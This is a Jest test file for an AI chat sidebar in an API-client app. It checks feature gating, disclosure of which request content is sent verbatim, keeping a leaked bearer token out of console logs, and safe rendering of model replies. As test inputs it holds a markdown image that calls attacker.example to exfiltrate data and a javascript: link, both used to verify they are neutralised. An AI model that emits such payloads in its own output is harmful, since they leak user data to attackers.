import '@testing-library/jest-dom';
import React from 'react';
import { render, screen, waitFor, fireEvent, act } from '@testing-library/react';
import { Provider } from 'react-redux';
import { configureStore } from '@reduxjs/toolkit';
import { ThemeProvider } from 'styled-components';
import theme from 'themes/dark/dark';
import AiChatSidebar from './index';

jest.mock('idb', () => ({ openDB: jest.fn(() => Promise.resolve(null)) }));

const mockGetAiStatus = jest.fn();
jest.mock('providers/ReduxStore/slices/ai', () => {
  const actual = jest.requireActual('providers/ReduxStore/slices/ai');
  return { ...actual, getAiStatus: (...args) => mockGetAiStatus(...args) };
});

const collection = {
  uid: 'col-1',
  name: 'Demo',
  pathname: '/demo',
  items: [
    {
      uid: 'tab-1',
      type: 'http-request',
      name: 'Get Users',
      pathname: '/demo/Get Users.bru',
      request: { method: 'GET', url: 'https://api.example.test/users', headers: [], params: [], docs: '' }
    }
  ]
};

const makeStore = ({ aiEnabled = true, isOpen = true, messages = [] } = {}) =>
  configureStore({
    reducer: {
      ai: jest.requireActual('providers/ReduxStore/slices/ai').default,
      app: (state = { preferences: { ai: { enabled: aiEnabled } } }) => state,
      tabs: (state = { tabs: [{ uid: 'tab-1', collectionUid: 'col-1', requestPaneTab: 'docs' }], activeTabUid: 'tab-1' }) =>
        state,
      collections: (state = { collections: [collection] }) => state
    },
    preloadedState: {
      ai: {
        isOpen,
        chats: messages.length
          ? {
              'tab-1': {
                conversationId: 'c-1',
                pathname: '/demo/Get Users.bru',
                collectionUid: 'col-1',
                contentType: 'docs',
                messages,
                isLoading: false,
                error: null,
                currentRequestId: null,
                createdAt: 1,
                historyList: []
              }
            }
          : {}
      }
    }
  });

const renderPanel = (opts) =>
  render(
    <Provider store={makeStore(opts)}>
      <ThemeProvider theme={theme}>
        <AiChatSidebar collection={collection} />
      </ThemeProvider>
    </Provider>
  );

describe('AiChatSidebar', () => {
  // jsdom has no layout engine and therefore no scrollIntoView.
  beforeAll(() => {
    window.HTMLElement.prototype.scrollIntoView = jest.fn();
  });

  beforeEach(() => {
    jest.clearAllMocks();
    mockGetAiStatus.mockResolvedValue({ providers: {}, models: [], availableModels: [] });
    window.ipcRenderer = { send: jest.fn(), on: jest.fn(() => jest.fn()), invoke: jest.fn(), openExternal: jest.fn() };
  });

  afterEach(() => {
    delete window.ipcRenderer;
  });

  /**
   * OFF MEANS OFF, ON THE WHOLE IPC SURFACE.
   *
   * `if (!aiEnabled) return null` sits at the BOTTOM of this component, so
   * every hook above it still runs with the feature switched off — including
   * the `main:ai-status-changed` subscription and the status poll. "Renders
   * nothing" therefore does not imply "does nothing", and each effect carries
   * its own gate. This asserts the whole surface: no render, no subscription,
   * no send, no invoke.
   *
   * The positive control below is what stops this being vacuous — with the
   * feature ON the same component does subscribe, so these are real
   * observations of a gate rather than of an inert mock.
   */
  it('renders nothing, subscribes to nothing and touches no IPC when AI is disabled', async () => {
    const { container } = renderPanel({ aiEnabled: false });

    expect(container.firstChild).toBeNull();
    await waitFor(() => expect(mockGetAiStatus).not.toHaveBeenCalled());
    expect(window.ipcRenderer.on).not.toHaveBeenCalled();
    expect(window.ipcRenderer.send).not.toHaveBeenCalled();
    expect(window.ipcRenderer.invoke).not.toHaveBeenCalled();
  });

  it('does subscribe once AI is enabled — the control for the assertion above', async () => {
    renderPanel({ aiEnabled: true });
    await waitFor(() => expect(mockGetAiStatus).toHaveBeenCalled());
    expect(window.ipcRenderer.on).toHaveBeenCalledWith('main:ai-status-changed', expect.any(Function));
  });

  it('renders nothing when the panel is closed', () => {
    const { container } = renderPanel({ isOpen: false });
    expect(container.firstChild).toBeNull();
  });

  it('renders the empty state for the active request', async () => {
    renderPanel();
    await waitFor(() => expect(mockGetAiStatus).toHaveBeenCalled());

    expect(screen.getByText('Gridman AI')).toBeInTheDocument();
    expect(screen.getByText('Get Users')).toBeInTheDocument();
    expect(screen.getByText('GET')).toBeInTheDocument();
  });

  /**
   * The content being edited goes to the model verbatim — redacting it would be
   * meaningless, since the reply is diffed against it. That is a defensible
   * call, but it is not one a customer should have to discover from the prompt,
   * so it is stated on the screen they press Send from.
   *
   * NAMING A SUBSET IS THE BUG THIS PINS. The text used to say only "Docs",
   * while `allContent` ships Tests, Pre-Request and Post-Response by the same
   * route (proved in ai-slice.spec.js, "sends every allContent slot verbatim").
   * Every verbatim channel has to be named here.
   */
  it('discloses every content channel that is sent as written', async () => {
    renderPanel();
    await waitFor(() => expect(mockGetAiStatus).toHaveBeenCalled());

    const disclosure = screen.getByTestId('ai-docs-disclosure');
    expect(disclosure).toHaveTextContent(/credentials are redacted before sending/i);
    expect(disclosure).toHaveTextContent(/sent as written/i);
    for (const channel of ['Docs', 'Tests', 'Pre-Request', 'Post-Response']) {
      expect(disclosure).toHaveTextContent(channel);
    }
    expect(disclosure).toHaveTextContent(/messages you type/i);
  });

  it('tells the user where to configure a model when none are available', async () => {
    renderPanel();
    await waitFor(() => expect(mockGetAiStatus).toHaveBeenCalled());

    expect(screen.getByText(/Add an endpoint or a provider key in Preferences > AI/i)).toBeInTheDocument();
  });

  it('offers docs suggestions when the docs pane is active', async () => {
    renderPanel();
    await waitFor(() => expect(mockGetAiStatus).toHaveBeenCalled());

    expect(screen.getByRole('button', { name: 'Generate full docs' })).toBeInTheDocument();
  });

  it('never says Bruno', async () => {
    const { container } = renderPanel();
    await waitFor(() => expect(mockGetAiStatus).toHaveBeenCalled());
    expect(container.textContent).not.toMatch(/bruno/i);
  });

  it('ships no popout button — the main process denies every window.open', async () => {
    renderPanel();
    await waitFor(() => expect(mockGetAiStatus).toHaveBeenCalled());
    expect(screen.queryByTestId('ai-popout-toggle')).not.toBeInTheDocument();
    expect(screen.queryByTitle('Open in new window')).not.toBeInTheDocument();
  });

  /**
   * A provider error message is attacker- or misconfiguration-controlled: a
   * badly behaved endpoint routinely echoes fragments of the request (headers,
   * body, URL) back in its error text. console output lands in devtools and in
   * log/crash captures, i.e. outside the app.
   */
  it('keeps the provider error message out of the console', async () => {
    const LEAKY = 'upstream rejected: Authorization: Bearer sk-live-SUPERSECRET';
    const handlers = {};
    window.ipcRenderer.on = jest.fn((channel, cb) => {
      handlers[channel] = cb;
      return jest.fn();
    });
    mockGetAiStatus.mockResolvedValue({ providers: {}, models: [], availableModels: [{ id: 'm-1', label: 'M1' }] });
    const consoleError = jest.spyOn(console, 'error').mockImplementation(() => {});

    const { container } = renderPanel();
    await waitFor(() => expect(mockGetAiStatus).toHaveBeenCalled());

    const textarea = await waitFor(() => {
      const el = container.querySelector('textarea');
      expect(el).toBeTruthy();
      return el;
    });

    await act(async () => {
      fireEvent.change(textarea, { target: { value: 'hello' } });
    });
    await act(async () => {
      fireEvent.click(screen.getByTitle('Send (Enter)'));
    });

    const sent = window.ipcRenderer.send.mock.calls.find(([channel]) => channel === 'renderer:ai-chat-stream');
    expect(sent).toBeTruthy();

    await act(async () => {
      handlers['main:ai-chat-error']({ requestId: sent[1].requestId, error: LEAKY });
    });

    await waitFor(() => expect(consoleError).toHaveBeenCalled());
    // Flatten by hand — JSON.stringify drops an Error's message entirely, which
    // would make this assertion pass while the message was in fact logged.
    const logged = consoleError.mock.calls
      .flat()
      .map((arg) => (arg instanceof Error ? `${arg.message} ${arg.stack || ''}` : String(arg)))
      .join(' | ');
    expect(logged).not.toContain('sk-live-SUPERSECRET');
    expect(logged).not.toContain('Bearer');
    // …but the user still sees it, inside the app.
    expect(screen.getByText(LEAKY)).toBeInTheDocument();

    consoleError.mockRestore();
  });

  describe('rendered model output', () => {
    const withAssistantMessage = (content) =>
      renderPanel({ messages: [{ role: 'assistant', content, isStreaming: false }] });

    it('renders no <img> for an image in a model reply', async () => {
      const { container } = withAssistantMessage('here you go ![](https://attacker.example/p.png?d=leaked)');
      await waitFor(() => expect(mockGetAiStatus).toHaveBeenCalled());

      expect(container.querySelectorAll('img')).toHaveLength(0);
      expect(container.innerHTML).not.toContain('attacker.example/p.png?d=leaked"');
    });

    it('opens a link in the OS browser instead of navigating the app window', async () => {
      const { container } = withAssistantMessage('see https://example.com/docs for more');
      await waitFor(() => expect(mockGetAiStatus).toHaveBeenCalled());

      const anchor = container.querySelector('[data-testid="ai-markdown-body"] a');
      expect(anchor).toBeTruthy();
      expect(anchor).not.toHaveAttribute('target');

      const clickEvent = new MouseEvent('click', { bubbles: true, cancelable: true });
      anchor.dispatchEvent(clickEvent);

      expect(clickEvent.defaultPrevented).toBe(true);
      expect(window.ipcRenderer.openExternal).toHaveBeenCalledWith('https://example.com/docs');
    });

    it('cancels the click without opening anything for a hostile scheme', async () => {
      const { container } = withAssistantMessage('[click me](javascript:alert(1))');
      await waitFor(() => expect(mockGetAiStatus).toHaveBeenCalled());

      // markdown-it never even builds the anchor for a rejected scheme.
      expect(container.querySelectorAll('[data-testid="ai-markdown-body"] a')).toHaveLength(0);
      expect(window.ipcRenderer.openExternal).not.toHaveBeenCalled();
    });
  });
});
